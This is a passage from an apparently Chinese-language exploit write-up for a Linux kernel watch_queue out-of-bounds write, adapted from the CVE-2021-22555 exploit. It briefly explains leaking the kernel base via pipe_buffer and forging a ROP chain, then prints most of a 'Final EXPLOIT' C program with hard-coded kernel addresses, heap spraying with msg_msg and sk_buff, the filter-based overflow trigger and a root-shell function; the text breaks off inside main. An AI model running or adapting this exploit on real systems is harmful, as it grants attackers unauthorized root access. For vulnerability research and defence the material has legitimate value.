中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *@len: length of data inside the @page</span><br><span class="hljs-comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址，操作如下：</p><ul><li>利用 <code>sk_buff</code> 修复辅助消息，之后从消息队列中接收该辅助消息，此时该 object 重回 slub 中，但 <code>sk_buff</code> 仍指向该 object</li><li>喷射 <code>pipe_buffer</code>，之后再接收 <code>sk_buff</code> 数据包，<strong>我们便能读出 pipe_buffer 上数据，泄露内核基址</strong></li></ul><h3 id="Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权"><a href="#Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权" class="headerlink" title="Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权"></a>Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权</h3><p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，而 UAF object 的地址对我们而言是已知的，因此<strong>我们可以直接利用 sk_buff 在 UAF object 上伪造函数表与构造 ROP chain，再选一条足够合适的 gadget 完成栈迁移便能劫持 RIP 完成提权</strong></p><p><img src="https://s2.loli.net/2022/04/06/P8AlaFMCqeSObn2.png" alt="image.png"></p><h3 id="Final-EXPLOIT"><a href="#Final-EXPLOIT" class="headerlink" title="Final EXPLOIT"></a>Final EXPLOIT</h3><p>最终的 exp 如下（基本上就是把 CVE-2021-22555 的 exp 里 trigger oob 的函数改一下就能打通了）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/watch_queue.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NUM 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 4096</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82a63be0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_sp, user_rflags;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;primary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;secondary_msg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * skb_shared_info need to take 320 bytes at the tail</span><br><span class="hljs-comment"> * so the max size of buf we should send is:</span><br><span class="hljs-comment"> * 1024 - 320 = 704</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> fake_secondary_msg[<span class="hljs-number">704</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    page;<br>    <span class="hljs-type">uint32_t</span>    offset, len;<br>    <span class="hljs-type">uint64_t</span>    ops;<br>    <span class="hljs-type">uint32_t</span>    flags;<br>    <span class="hljs-type">uint32_t</span>    padding;<br>    <span class="hljs-type">uint64_t</span>    private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    confirm;<br>    <span class="hljs-type">uint64_t</span>    release;<br>    <span class="hljs-type">uint64_t</span>    try_steal;<br>    <span class="hljs-type">uint64_t</span>    get;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next,</span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> m_list_prev, <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts, </span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spraySkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span><br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">freeSkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigerOutOfBoundWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_filter</span> *<span class="hljs-title">wfilter</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nfilters;<br>    <br>    nfilters = <span class="hljs-number">4</span>;<br>    wfilter = (<span class="hljs-keyword">struct</span> watch_notification_filter*)<br>            <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> watch_notification_filter)<br>                + nfilters * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> watch_notification_type_filter));<br>    wfilter-&gt;nr_filters = nfilters;<br><br>    <span class="hljs-comment">// normal filter</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (nfilters - <span class="hljs-number">1</span>); i++)<br>        wfilter-&gt;filters[i].type = <span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-comment">// evil filter</span><br>    <span class="hljs-comment">// 0x300 = 64 * 12, 12 * 8 = 96bytes</span><br>    <span class="hljs-comment">// 1 &lt;&lt; 0xa = 1024, maybe we can hit a proper bit</span><br>    wfilter-&gt;filters[nfilters - <span class="hljs-number">1</span>].type = <span class="hljs-number">0x30a</span>;<br><br>    <span class="hljs-comment">// triger oob write</span><br>    <span class="hljs-keyword">if</span> (ioctl(pipe_fd[<span class="hljs-number">0</span>], IOC_WATCH_QUEUE_SET_FILTER, wfilter) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to ioctl IOC_WATCH_QUEUE_SET_FILTER!&quot;</span>);<br>    <br>    <span class="hljs-comment">// prevent memory leak in userspace(no need in fact)</span><br>    <span class="hljs-built_in">free</span>(wfilter);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid())<br>        errExit(<span class="hljs-string">&quot;failed to gain the root!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span>         oob_pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         sk_sockets[SOCKET_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         pipe_fd[PIPE_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span>         victim_qid, real_qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg_prim</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buf_ptr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br>    <span class="hljs-type">uint64_t</span>    victim_addr;<br>    <span class="hljs-type">uint64_t</span>   